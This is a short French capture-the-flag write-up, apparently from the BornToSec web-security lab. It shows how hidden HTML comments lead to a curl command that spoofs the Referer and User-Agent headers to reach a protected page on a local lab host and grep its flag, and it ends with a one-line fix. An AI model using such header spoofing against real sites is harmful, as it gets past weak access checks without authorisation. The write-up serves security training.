# Edit header

## Trouver la faille
Dans le footer on peut cliquer sur BornToSec, on accéde a une page o`ù on trouve pleins de commentaires parmis ces commentaires y'a ceux qui nou intéresse

<!--
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->

<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->

pour celà on va utiliser une commande curl

```bash
curl -e https://www.nsa.gov/ -A ft_bornToSec http://192.168.1.40/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c | grep flag
```

## Comment utiliser cette faille
Comme l'exemple on a pu accéder a une partie admin

## Solution
On peut éviter ça avec une connexion admin ou méme en utilisant des token de pass
